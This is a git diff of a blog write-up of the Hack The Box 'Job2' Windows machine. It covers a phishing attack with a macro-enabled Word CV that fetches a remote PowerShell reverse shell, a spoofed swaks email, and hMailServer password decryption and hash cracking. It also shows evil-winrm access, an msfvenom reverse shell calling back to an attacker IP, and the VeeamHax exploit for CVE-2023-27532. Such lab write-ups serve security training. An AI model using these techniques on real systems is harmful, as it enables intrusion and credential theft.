@@ -7,7 +7,13 @@ TocOpen: true
 tags:
   - blog
   - HTB
-lastmod: 2026-02-23T14:29:18.978Z
+  - send-email
+  - Windows-Privilege-Escalation-hMailServer
+  - Windows-Privilege-Escalation-Veeam-Backup
+  - phishing-by-Word
+  - windows
+  - hard
+lastmod: 2026-02-23T16:00:09.155Z
 ---
 # Box Info
 
@@ -111,7 +117,8 @@ sudo vim /etc/hosts
 
 ### Web Recon http://www.job2.vl/
 
-Found the hr@job2.vl which can added into the wordlist\
+During the manual review of the web application, a point of contact was discovered: `hr@job2.vl`. This email address presented a viable target for a client-side social engineering attack, specifically submitting a malicious curriculum vitae (CV).
+
 ![Pasted image 20260210141619.png](/ob/Pasted%20image%2020260210141619.png)
 
 ### WebSite Directory BurteForce
@@ -136,11 +143,21 @@ Show that is the IIS\
 
 ### Create Malicious CV by Microsoft Office word  2
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "phishing-by-Word" >}} create the macro-enabled Word document with the rce payload which executes automatically when the target enables macros upon opening the document.
+
+{{< /toggle >}}
+
+To exploit the Human Resources contact, a macro-enabled Word document (`My_CV.docm`) was crafted. The payload relies on the `AutoOpen()` subroutine, which executes automatically when the target enables macros upon opening the document.
+
 ![Pasted image 20260210145916.png](/ob/Pasted%20image%2020260210145916.png)
 
 Alt-F11 will open the macro editor. I’ll write an `AutoOpen` function which will run on opening of the document: and save the file type by word macros-enable
 
 ![Pasted image 20260210150345.png](/ob/Pasted%20image%2020260210150345.png)
+
+The macro utilizes the `Shell` function to invoke a hidden PowerShell process, downloading and executing a remote payload in memory:
 
 ```
 Sub AutoOpen()
@@ -150,7 +167,7 @@ End Sub
 
 ![Pasted image 20260210150449.png](/ob/Pasted%20image%2020260210150449.png)
 
-create the `shell.ps1`
+Simultaneously, a standard PowerShell reverse shell script (`shell.ps1`) was generated and hosted on a local Python HTTP server on port 80. A Netcat listener was established on port 443 to catch the incoming connection.
 
 ![Pasted image 20260210150102.png](/ob/Pasted%20image%2020260210150102.png)
 
@@ -180,7 +197,17 @@ listening on [any] 443 ...
 
 ```
 
-### send email
+### Send email
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "send-email" >}} send the email form the bash by using the swaks , also added the file docm file by using the --attach command
+
+{{< /toggle >}}
+
+With the infrastructure staged, the payload was delivered directly to the target's SMTP server (`10.129.251.205`) using `swaks`. Bypassing traditional mail clients allowed for direct interaction with the open relay on port 25 and facilitated sender spoofing.
+
+The following command attached the malicious document and dispatched the email from a spoofed address (`hay@hay.com`):
 
 ```
 swaks --to hr@job2.vl --from hay@hay.com --header "Subject: Hire me" --body "Please check the CV " --attach @My_CV.docm  --server 10.129.251.205
@@ -548,13 +575,21 @@ need to use `--attach @[filename]` so that `bash` will pass the contents of the 
 
 ```
 
+reveived the shell form target as to the julian
+
 ![Pasted image 20260210151248.png](/ob/Pasted%20image%2020260210151248.png)
 
 ***
 
 # Shell as root
 
-in the Program Files (x86) , found the
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Escalation-hMailServer" >}} local enumeration revealed an installation of hMailServer Examination of the configuration file (hMailServer.INI) disclosed the database connection parameters, including an encrypted database password (4e9989caf04eaa5ef87fd1f853f08b62). Finally will hashcat to decode the password
+
+{{< /toggle >}}
+
+Following initial access, local enumeration revealed an installation of hMailServer in `C:\Program Files (x86)\hMailServer`. Examination of the configuration file (`hMailServer.INI`) disclosed the database connection parameters, including an encrypted database password (`4e9989caf04eaa5ef87fd1f853f08b62`).
 
 ```
 Common Files 
@@ -574,6 +609,8 @@ dir
 type hMailServer.INI
 [Directories] ProgramFolder=C:\Program Files (x86)\hMailServer DatabaseFolder=C:\Program Files (x86)\hMailServer\Database DataFolder=C:\Program Files (x86)\hMailServer\Data LogFolder=C:\Program Files (x86)\hMailServer\Logs TempFolder=C:\Program Files (x86)\hMailServer\Temp EventFolder=C:\Program Files (x86)\hMailServer\Events [GUILanguages] ValidLanguages=english,swedish [Security] AdministratorPassword=8a53bc0c0c9733319e5ee28dedce038e [Database] Type=MSSQLCE Username= Password=4e9989caf04eaa5ef87fd1f853f08b62 PasswordEncryption=1 Port=0 Server= Database=hMailServer Internal=1
 ```
+
+hMailServer utilizes a known encryption mechanism (Blowfish in ECB mode) with a static hardcoded key (`THIS_KEY_IS_NOT_SECRET`). A Python script was utilized to swap the endianness and decrypt the database password.
 
 ```
 #!/usr/bin/env python3
@@ -630,13 +667,15 @@ The database version is too old for this DLL. I’ll upgrade it (since I’m wor
 
 ![Pasted image 20260210163951.png](/ob/Pasted%20image%2020260210163951.png)
 
-shell
+This extraction yielded NTLM hashes for three local mail users: `Julian`, `Ferdinand`, and `hr`.
 
 `vim hmail_hashes `
 
 ```
 Julian@job2.vl:8981c81abda0acadf1d12dd9d213bac7c51c022a34268058af3757607075e0eb49f76f Ferdinand@job2.vl:04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11 hr@job2.vl:1a5adad158ccffd81db73db040c72109067add598fafc47bbbd92da9a69661af94f055
 ```
+
+The hash for `Ferdinand` was subjected to an offline dictionary attack using Hashcat (Mode 1421 for hMailServer) and the `rockyou.txt` wordlist, successfully cracking the password: `Franzi123!`.
 
 ```
 $ hashcat hmail_hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
@@ -652,6 +691,8 @@ Approaching final keyspace - workload adjusted.
 ...[snip]...
 ```
 
+The recovered credentials for `Ferdinand` permitted lateral movement via Windows Remote Management (WinRM). Access was established using `evil-winrm-py` on port 5985.
+
 ```
 └─# evil-winrm-py -i JOB2  -u Ferdinand  -p Franzi123!
           _ _            _                             
@@ -666,6 +707,14 @@ Approaching final keyspace - workload adjusted.
 evil-winrm-py PS C:\Users\Ferdinand\Documents>
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Escalation-Veeam-Backup" >}} running processes as `Ferdinand` identified the presence of Veeam Backup & Replication software, Checking the file version of the primary executable (Veeam.Backup.Shell.exe) confirmed version 10.0.1.4854. This specific build is vulnerable to CVE-2023-27532, an unauthenticated credential exposure and Remote Code Execution (RCE) vulnerability within the Veeam Backup Service.
+
+{{< /toggle >}}
+
+Further enumeration of the file system and running processes as `Ferdinand` identified the presence of Veeam Backup & Replication software.
 
 ```
 evil-winrm-py PS C:\Program Files> dir
@@ -867,6 +916,8 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 ![Pasted image 20260214113831.png](/ob/Pasted%20image%2020260214113831.png)
 
+Checking the file version of the primary executable (`Veeam.Backup.Shell.exe`) confirmed version `10.0.1.4854`. This specific build is vulnerable to **CVE-2023-27532**, an unauthenticated credential exposure and Remote Code Execution (RCE) vulnerability within the Veeam Backup Service.
+
 ```
 evil-winrm-py PS C:\Program Files>  [System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.S
 hell.exe").FileVersion
@@ -876,7 +927,7 @@ evil-winrm-py PS C:\Program Files>
 
 ```
 
-I’ll find [CVE-2023-27532](https://nvd.nist.gov/vuln/detail/cve-2023-27532):
+[CVE-2023-27532](https://nvd.nist.gov/vuln/detail/cve-2023-27532): To exploit the vulnerability, the `VeeamHax` C# exploit was compiled and staged. The exploit binary (`VeeamHax.exe`) and its required dependencies (`Veeam.Backup.Common.dll`, `Veeam.Backup.Interaction.MountService.dll`, `Veeam.Backup.Model.dll`) were uploaded to the target's `C:\programdata` directory via WinRM.
 
 > Vulnerability in Veeam Backup & Replication component allows encrypted credentials stored in the configuration database to be obtained. This may lead to gaining access to the backup infrastructure hosts.
 
@@ -919,6 +970,8 @@ evil-winrm-py PS C:\programdata>
 
 ```
 
+Simultaneously, a standard Windows reverse TCP shell executable (`reverse.exe`) was generated using `msfvenom` and uploaded to the same directory.
+
 ```
 └─#  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17  LPORT=443  -f exe -o reverse.exe
 
@@ -930,6 +983,8 @@ Final size of exe file: 7168 bytes
 Saved as: reverse.exe
                                     
 ```
+
+The Veeam Backup Service, which operates with elevated privileges, executed the binary. A connection was caught on the listening Netcat instance, resulting in a shell operating within the context of `nt authority\system`.
 
 ```
 evil-winrm-py PS C:\programdata> .\VeeamHax.exe --cmd "C:\programdata\reverse.exe"
